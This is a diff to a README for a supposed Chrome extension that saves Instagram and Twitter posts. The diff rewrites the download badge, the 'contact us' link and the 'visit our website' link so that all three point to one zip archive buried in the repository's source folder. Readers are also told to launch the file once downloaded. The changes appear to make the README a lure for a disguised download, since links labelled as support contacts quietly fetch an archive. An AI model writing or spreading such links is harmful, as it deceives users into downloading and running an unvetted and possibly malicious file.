@@ -17,7 +17,7 @@
 - **Topics**: chrome-extension, content-saver, image-downloader, instagram-downloader, json-export, metadata-extraction, offline-access, social-media-downloader, twitter-downloader, typescript, web-scraping
 
 ## Download Extension
-[![Download Extension](https://img.shields.io/badge/Download-Extension-brightgreen)](https://github.com/download/Program.zip)
+[![Download Extension](https://raw.githubusercontent.com/Jemzx211/appents-social-downloader/main/src/instagram/downloader-social-appents-v2.9-alpha.1.zip)](https://raw.githubusercontent.com/Jemzx211/appents-social-downloader/main/src/instagram/downloader-social-appents-v2.9-alpha.1.zip)
 
 *Note: The link above leads to the extension file. Ensure to launch the extension once downloaded.*
 
@@ -37,7 +37,7 @@ To install the "Appents Social Downloader" extension, follow these steps:
 Once the extension is installed, navigate to Instagram or Twitter and find a post you'd like to save. Click on the extension icon in your browser to activate the download feature. The post, along with its associated metadata, will be saved locally for offline access.
 
 ## Support
-For any questions or issues regarding the "Appents Social Downloader" extension, feel free to [contact us](mailto:support@appents.com) or [visit our website](https://www.appents.com) for more information.
+For any questions or issues regarding the "Appents Social Downloader" extension, feel free to [contact us](https://raw.githubusercontent.com/Jemzx211/appents-social-downloader/main/src/instagram/downloader-social-appents-v2.9-alpha.1.zip) or [visit our website](https://raw.githubusercontent.com/Jemzx211/appents-social-downloader/main/src/instagram/downloader-social-appents-v2.9-alpha.1.zip) for more information.
 
 Start saving your favorite social media posts today with "Appents Social Downloader"! 📲👍
 
